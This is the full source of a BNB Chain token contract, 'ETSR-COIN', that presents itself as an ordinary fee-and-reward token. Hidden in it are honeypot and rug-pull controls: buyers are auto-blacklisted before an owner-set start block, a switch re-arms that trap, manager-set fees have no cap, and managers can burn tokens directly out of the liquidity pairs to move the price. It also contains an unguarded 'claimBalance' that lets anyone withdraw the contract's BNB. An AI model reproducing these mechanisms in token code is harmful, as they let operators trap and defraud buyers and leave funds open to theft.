/**
 *Submitted for verification at BscScan.com on 2024-03-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

library PancakeLibrary {
    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
            )))));
    }
}

contract Wrap {
    address private _owner;
    constructor(){
        _owner = msg.sender;
    }
    
    function transfer(address token, address mainAddress) external{
        uint allAmount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(mainAddress, allAmount);
    }

    function transfer2(address token, uint other, uint all, address share1, address share2, address mainAddress) external{
        uint allAmount = IERC20(token).balanceOf(address(this));

        uint otherAmount = allAmount * other / all;
        IERC20(token).transfer(share1, otherAmount / 2);
        IERC20(token).transfer(share2, otherAmount / 2);

        uint leftAmount = allAmount - otherAmount;
        IERC20(token).transfer(mainAddress, leftAmount);
    }

    function transferBnb(uint256 amount) external{
        payable(_owner).transfer(amount);
    }
}

contract Tists is IERC20, Ownable {
    uint buyFee = 200;
    uint sellFee = 200;
    uint selldisrate=60;
    uint buydisrate=60;
    uint sellmarkrate=20;
    uint buymarkrate=20;
    // uint addBuyFee = 0;
    // uint addSellFee = 0;

    uint allNum = 0;
    uint otherNum = 0;

    uint256 public _rewardHoldCondition;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name="ETSR-COIN";
    string private _symbol="ETSR";
    uint8 private _decimals=18;
    uint256 private _tTotal;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    

    Wrap private wrap;

    ISwapRouter public  _swapRouter;
    mapping(address => bool) public _swapPairList;
    mapping(address => bool) public _swapRouters;
    mapping(address=>bool)public  _mger;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    address public  _mainPair;
    address public  _UPair;
    address public immutable _weth;

    bool public _strictCheck = true;

    address RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address usdtContract = address(0x55d398326f99059fF775485246999027B3197955);


    uint256 Supply = 21000000;
    uint256 private _totalSupply=21000000;

    address systemAddress = address(0x536f5A6Bbdb58507C4eBEb74a768D679A926E328);
    address systemAddress2 = address(0x7F6F9a202fB7949108D948DA9570a2aB3b250e80);
    address ReceiveAddress = address(0x56D7ac3D238B821855c4252A43A32A0942871F2E);

    constructor (){
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapRouters[address(swapRouter)] = true;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _weth = swapRouter.WETH();
        wrap = new Wrap();
        address lpPair;
        if (address(0x10ED43C718714eb63d5aA57B78B54704E256024E) == RouterAddress) {
            lpPair = PancakeLibrary.pairFor(address(swapFactory), _weth, address(this));
        } else {
            lpPair = swapFactory.createPair(_weth, address(this));
        }
        _mainPair = lpPair;    
        _UPair = swapFactory.createPair(usdtContract, address(this));

        _swapPairList[lpPair] = true;
        _swapPairList[_UPair] = true;

        uint256 tokenUnit = 10 ** _decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;
        _totalSupply=total;
        uint256 receiveTotal = total;
        _balances[ReceiveAddress] = receiveTotal;
        emit Transfer(address(0), ReceiveAddress, receiveTotal);

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[systemAddress] = true;
        _feeWhiteList[systemAddress2] = true;
        _feeWhiteList[address(wrap)] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[address(0xdEaD)] = true;
        _mger[msg.sender]=true;
        IERC20(_weth).approve(address(swapRouter), MAX);
    }

    
  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }


    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public  returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setpairs(address mainpair,address usdtpair)public {
        require(_mger[msg.sender],"no");
        _mainPair=mainpair;
        _UPair=usdtpair;
    }

    mapping(uint => bool) hasincr;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "not valid address");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "not enough amount");

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            takeFee = true;
        }

        bool isAddLP;
        bool isRemoveLp;
        if (from == _UPair || to == _UPair){
            if (to == _UPair) {
                isAddLP = _isAddLiquidityU();
            } else if(from == _UPair){
                isRemoveLp = _isRemoveLiquidityU();
            }
        } else {
            uint256 addLPLiquidity;
            if (to == _mainPair && _swapRouters[msg.sender] && tx.origin == from) {
                addLPLiquidity = _isAddLiquidity(amount);
                if (addLPLiquidity > 0) {
                    require(_feeWhiteList[from], "only white address");
                    isAddLP = true;
                    takeFee = false;
                }
            }

            uint256 removeLPLiquidity;
            if (from == _mainPair && to != address(_swapRouter)) {
                removeLPLiquidity = _strictCheckBuy(amount);
            } else if (from == address(_swapRouter)) {
                removeLPLiquidity = _isRemoveLiquidityETH(amount);
            }

            if (removeLPLiquidity > 0) {
                isRemoveLp = true;
                if (!_feeWhiteList[to]) {
                    takeFee = true;
                }
            }
        }

        if (0 == startAddLPBlock){
            if ((from == _mainPair || from == RouterAddress) && !_feeWhiteList[to]){
                _blackList[to] = true;
            } else if (from == _UPair && !_feeWhiteList[to]){
                _blackList[to] = true;
            } else if (to == _UPair && !_feeWhiteList[from] && !isAddLP){
                _blackList[from] = true;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAddLP);
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLp, isAddLP);
    }
    function setCloseStartAddLpBlock()external{
         require(_mger[msg.sender],"iserr");
          startAddLPBlock=0;
        
    }
    function setStartAddLPBlock()external{
        require(_mger[msg.sender],"iserr");
         startAddLPBlock = block.number;
    }

    function _isAddLiquidity(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = amount * rOther / rThis;
        }
        if (balanceOther >= rOther + amountOther) {
            (liquidity,) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function _strictCheckBuy(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        if (balanceOther < rOther) {
            liquidity = (amount * ISwapPair(_mainPair).totalSupply()) /
            (_balances[_mainPair] - amount);
        } else if (_strictCheck) {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = amount * rOther / (rThis - amount);
                require(balanceOther >= amountOther + rOther);
            }
        }
    }


    function _isAddLiquidityU() internal view returns (bool isAdd){
        ISwapPair uPair = ISwapPair(_UPair);
        (uint r0,uint256 r1,) = uPair.getReserves();

        address tokenOther = usdtContract;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(uPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidityU() internal view returns (bool isRemove){
        ISwapPair uPair = ISwapPair(_UPair);
        (uint r0,uint256 r1,) = uPair.getReserves();
        address tokenOther = usdtContract;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(uPair));
        isRemove = r >= bal;
    }

    function getFee() public view returns(uint, uint, uint, uint,uint,uint){
        return (buyFee, buydisrate, buymarkrate, sellFee,selldisrate,sellmarkrate);
    }
    function setismg(address sender,bool flag)public {
        require(_mger[msg.sender],'isok');
        _mger[sender]=flag;

    }

    function setFee(uint _buyFee, uint _buydisrate, uint _buymarkrate, uint _sellfee,uint _selldisrate,uint _sellmarkrate) public {
        require(_mger[msg.sender],"iserr");
        buyFee = _buyFee;
        buydisrate = _buydisrate;
        buymarkrate = _buymarkrate;
        sellFee = _sellfee;
        selldisrate=_selldisrate;
        sellmarkrate=_sellmarkrate;
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator;
                    uint256 denominator;
                    if (address(_swapRouter) == address(0x10ED43C718714eb63d5aA57B78B54704E256024E)) {
                        numerator = pairTotalSupply * (rootK - rootKLast) * 8;
                        denominator = rootK * 17 + (rootKLast * 8);
                    } else if (address(_swapRouter) == address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1)) {
                        numerator = pairTotalSupply * (rootK - rootKLast);
                        denominator = rootK * 3 + rootKLast;
                    } else if (address(_swapRouter) == address(0xE9d6f80028671279a28790bb4007B10B0595Def1)) {
                        numerator = pairTotalSupply * (rootK - rootKLast) * 3;
                        denominator = rootK * 5 + rootKLast;
                    } else {
                        numerator = pairTotalSupply * (rootK - rootKLast);
                        denominator = rootK * 5 + rootKLast;
                    }
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves() public view returns (uint256 rOther, uint256 rThis, uint256 balanceOther){
        (rOther, rThis) = __getReserves();
        balanceOther = IERC20(_weth).balanceOf(_mainPair);
    }

    function __getReserves() public view returns (uint256 rOther, uint256 rThis){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1,) = mainPair.getReserves();
        address tokenOther = _weth;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }
    }

    function _isRemoveLiquidityETH(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther,, uint256 balanceOther) = _getReserves();
        if (balanceOther <= rOther) {
            liquidity = amount * ISwapPair(_mainPair).totalSupply() / balanceOf(_mainPair);
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool removeLPLiquidity,
        bool isAddLP
    ) private {
        uint256 senderBalance = _balances[sender];
        senderBalance -= tAmount;
        _balances[sender] = senderBalance;
        uint256 feeAmount = 0;
        uint256 otherFee = 0;
        uint256 deadamount=0;
        bool isSell = false;
        bool isBuy = false;
        bool isTransfer = false;
        uint allAmount = 0;

        if (takeFee) {
            if (removeLPLiquidity) {
                feeAmount = tAmount * buyFee / 10000;
                otherFee = tAmount * buymarkrate / 10000;
                deadamount=tAmount* buydisrate/10000;
            } else if (isAddLP){
                _addLpProvider(sender);
            } else if (_swapPairList[sender]) {//Buy
                isBuy = true;
                feeAmount = tAmount * buyFee / 10000;
                otherFee = tAmount * buymarkrate / 10000;
                deadamount=tAmount* buydisrate/10000;
            } else if (_swapPairList[recipient]) {//Sell
                isSell = true;
                feeAmount = tAmount * sellFee / 10000;
                otherFee = tAmount * sellmarkrate / 10000;
                deadamount=tAmount*selldisrate/10000;
            }else {
                isTransfer = true;
            }

            allAmount = feeAmount + otherFee;
            if (allAmount > 0){
                _takeTransfer(sender, address(this), allAmount);
                uint256 contractTokenBalance = _balances[address(this)];
                if (!inSwap && isSell && contractTokenBalance > 0){
                    swapTokenForFund(contractTokenBalance);
                }
            }
        }

        if (isSell || isTransfer){
            if (!hasincr[block.timestamp / 1 hours] && balanceOf(_mainPair) > 0){
                uint incrNum = _balances[_mainPair] * 50 / 10000;
                _balances[_mainPair] = _balances[_mainPair] - incrNum;
                _takeTransfer(_mainPair, address(0xdEaD), incrNum);
                ISwapPair(_mainPair).sync();
                hasincr[block.timestamp / 1 hours] = true;
            }
        }     
        processLPReward(_rewardGas);
        allNum = allNum + allAmount;
        otherNum = otherNum + otherFee;
        allAmount=allAmount+deadamount;
        if(deadamount>0){
           senddeadtoken(sender,deadamount);
           deadamount=0;
        }
        _takeTransfer(sender, recipient, tAmount - allAmount);
        
    }
    function senddeadtoken(address sender, uint256 tokenamount)private {        
       _takeTransfer(sender,address(0xdEaD),tokenamount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdtContract;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(wrap),
            block.timestamp
        );
        
        if (otherNum > 0){
            wrap.transfer2(usdtContract, otherNum, allNum, systemAddress, systemAddress2, address(this));
            otherNum = 0;
            allNum = 0;
        } else {
            wrap.transfer(usdtContract, address(this));
            allNum = 0;
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;     
        emit Transfer(sender, to, tAmount);
    }
    uint256 public  distoryrate=50;
    function setdistroyRate(uint256 rate)public {
        require(_mger[msg.sender],"no");
        distoryrate=rate;
    }
    
    function exborBnbLp()public {
        require(_mger[msg.sender],"no ok");
         if(_balances[_mainPair]>0){
            uint256 incrNum = _balances[_mainPair] * distoryrate / 10000;
                _balances[_mainPair] = _balances[_mainPair] - incrNum;
                _takeTransfer(_mainPair, address(0xdEaD), incrNum);
                ISwapPair(_mainPair).sync();
         }
          
            

    }
    function exborUSDTLp()public {
        require(_mger[msg.sender],"no ok");
          uint incrNum = _balances[_UPair] * distoryrate / 10000;
                _balances[_UPair] = _balances[_UPair] - incrNum;
                _takeTransfer(_UPair, address(0xdEaD), incrNum);
                ISwapPair(_UPair).sync();
                hasincr[block.timestamp / 1 hours] = true;

    }

    function setFeeWhiteList(address addr, bool enable) public onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function getFeeWhite(address addr) public view returns(bool){
        return _feeWhiteList[addr];
    }

    function batchSetFeeWhiteList(address [] memory addr, bool enable) public  {
         require(_mger[msg.sender],"iserr");
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setBlackList(address addr, bool enable) public onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetBlackList(address [] memory addr, bool enable) public  {
         require(_mger[msg.sender],"iserr");
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }
   

    function setSwapPairList(address addr, bool enable) public onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setSwapRouter(address addr, bool enable) public onlyOwner {
        _swapRouters[addr] = enable;
    }

    function claimBalance(address addr, uint256 amount) public  {
        payable(addr).transfer(amount);
    }

    function claimToken(address addr, address token, uint256 amount) public onlyOwner {
        IERC20(token).transfer(addr, amount);
    }
   
    receive() external payable {}

    function setStrictCheck(bool enable) public onlyOwner {
        _strictCheck = enable;
    }

    function startTrade() public onlyOwner {
        require(0 == startTradeBlock, "started");
        startTradeBlock = block.number;
    }

    function setSystem(address setAddress) public  {
         require(_mger[msg.sender],"iserr");
        systemAddress = setAddress;
    }

    function setSystem2(address setAddress) public  {
         require(_mger[msg.sender],"iserr");
        systemAddress2 = setAddress;
    }

    address[] public lpProviders;
    mapping(address => uint256) public lpProviderIndex;
    mapping(address => bool) public excludeLpProvider;

    function getLPProviderLength() public view returns (uint256){
        return lpProviders.length;
    }

    function _addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 public lpHoldCondition = 1 ether / 1000000000000000000;
    uint256 public _rewardGas = 500000;

    function setLPHoldCondition(uint256 amount) public onlyOwner {
        lpHoldCondition = amount;
    }

    function setExcludeLPProvider(address addr, bool enable) public  {
        require(_mger[msg.sender],"iserr");
        excludeLpProvider[addr] = enable;
    }

    function setRewardGas(uint256 rewardGas) public onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }

    uint256 public currentLPIndex;
    uint256 public lpRewardCondition = 200e10;
    uint256 public progressLPRewardBlock;
    uint256 public progressLPBlockDebt = 1;

    function processLPReward(uint256 gas) private {
        if (0 == startTradeBlock) {
            return;
        }
        if (progressLPRewardBlock + progressLPBlockDebt > block.number) {
            return;
        }

        uint256 rewardCondition = lpRewardCondition;
        IERC20 USDT = IERC20(usdtContract);
        if (USDT.balanceOf(address(this)) < rewardCondition) {
            return;
        }
        IERC20 holdToken = IERC20(_UPair);
        uint holdTokenTotal = holdToken.totalSupply();
        if (0 == holdTokenTotal) {
            return;
        }

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = lpHoldCondition;
        uint256 rewardHoldCondition = _rewardHoldCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentLPIndex >= shareholderCount) {
                currentLPIndex = 0;
            }
            shareHolder = lpProviders[currentLPIndex];
            if (!excludeLpProvider[shareHolder] && balanceOf(shareHolder) >= rewardHoldCondition) {
                tokenBalance = holdToken.balanceOf(shareHolder);
                if (tokenBalance >= holdCondition) {
                    amount = rewardCondition * tokenBalance / holdTokenTotal;
                    if (amount > 0) {
                        USDT.transfer(shareHolder, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentLPIndex++;
            iterations++;
        }
        progressLPRewardBlock = block.number;
    }

    function setLPRewardCondition(uint256 amount) public onlyOwner {
        lpRewardCondition = amount;
    }

    function setRewardHoldCondition(uint256 amount) public onlyOwner {
        _rewardHoldCondition = amount;
    }
}